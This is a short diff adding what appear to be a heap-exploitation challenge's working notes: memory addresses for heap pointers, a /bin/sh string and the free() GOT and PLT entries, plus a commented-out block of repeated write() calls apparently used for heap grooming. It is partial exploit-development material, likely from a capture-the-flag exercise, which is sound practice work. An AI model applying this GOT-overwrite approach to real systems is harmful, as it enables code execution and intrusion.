@@ -1,0 +1,30 @@
+
+# first heap message is at 0x6036b0
+# HEAP_PTRS at 0x6020a0
+# SIZe at at 0x6020e0
+
+# location of /bin/sh is 0x7ffff7f5ae43
+# 0x7ffff7f5ae43 at 0x7ffff7f98460
+
+# free in got table is at 0x602018 w/ 0x400646
+# free@plt is at 0x00007ffff7ddb3f0
+#  at 0x400520
+
+
+'''write(b'0'*10, b'32')
+write(b'0'*10, b'48')
+write(b'0'*10, b'64')
+write(b'0'*10, b'80')
+write(b'0'*10, b'96')
+write(b'0'*10, b'112')
+write(b'0'*10, b'128')
+write(b'0'*10, b'144')
+write(b'0'*10, b'160')
+write(b'0'*10, b'176')
+write(b'0'*10, b'192')
+write(b'0'*10, b'208')
+write(b'0'*10, b'224')
+write(b'0'*10, b'240')
+write(b'0'*10, b'17')
+write(b'0'*10, b'34')
+write(b'0'*10, b'24')'''
